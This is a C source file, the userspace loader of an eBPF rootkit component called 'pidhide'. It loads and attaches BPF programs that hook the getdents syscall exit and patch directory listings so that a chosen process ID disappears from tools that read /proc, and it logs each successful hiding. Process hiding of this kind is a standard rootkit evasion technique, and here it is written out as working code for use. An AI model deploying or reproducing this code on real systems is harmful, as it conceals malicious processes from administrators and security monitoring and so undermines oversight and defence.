#include "pidhide.h"

static int handle_event(void *ctx, void *data, size_t size)
{
  if (DEBUG_ENABLED)
  {
    const struct event *event = data;
    if (event->success)
      printf("hid PID from program %d (%s)\n", event->pid, event->comm);
    else
      printf("failed to hide PID from program %d (%s)\n", event->pid, event->comm);
  }
  return 0;
}

void destroy_pidhide(struct pidhide_kern *skel)
{
  pidhide_kern__destroy(skel);
}

int setup_pidhide(struct pidhide_kern *skel, int target_pid)
{
  struct ring_buffer *rb = NULL;
  int err, index, prog_fd, ret;
  char pid_to_hide[MAX_PID_LEN];

  if (!skel)
  {
    fprintf(stderr, "failed to open pidhide_kern program: %s\n", strerror(errno));
    return -1;
  }

  // set the pid to hide, defaulting to our own pid
  snprintf(pid_to_hide, sizeof(pid_to_hide), "%d", target_pid);
  strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
  skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;

  // verify and load program
  err = pidhide_kern__load(skel);
  if (err)
  {
    fprintf(stderr, "failed to load and verify pidhide_kern skeleton\n");
    pidhide_kern__destroy(skel);
    return -1;
  }

  // setup maps for tail calls
  index = PIDHIDE_PROG_01;
  prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
  ret = bpf_map_update_elem(
    bpf_map__fd(
    skel->maps.map_prog_array),
    &index,
    &prog_fd,
    BPF_ANY
  );

  if (ret == -1)
  {
    printf("failed to add program to prog array! %s\n", strerror(errno));
    pidhide_kern__destroy(skel);
    return -1;
  }

  index = PIDHIDE_PROG_02;
  prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
  ret = bpf_map_update_elem(
    bpf_map__fd(skel->maps.map_prog_array),
    &index,
    &prog_fd,
    BPF_ANY
  );
  if (ret == -1)
  {
    printf("failed to add program to prog array! %s\n", strerror(errno));
    pidhide_kern__destroy(skel);
    return -1;
  }

  err = pidhide_kern__attach( skel);
  if (err)
  {
    fprintf(stderr, "failed to attach pidhide_kern program: %s\n", strerror(errno));
    pidhide_kern__destroy(skel);
    return -1;
  }

  rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
  if (!rb)
  {
    fprintf(stderr, "failed to create ring buffer\n");
    pidhide_kern__destroy(skel);
    return -1;
  }

  printf("hiding PID %d ...\n", target_pid);
  while (true)
  {
    err = ring_buffer__poll(rb, 100);
    if (err == -EINTR)
    {
      err = 0;
      break;
    }
    if (err < 0)
    {
      printf("error polling ring buffer: %d\n", err);
      break;
    }
  }

  return 0;
}
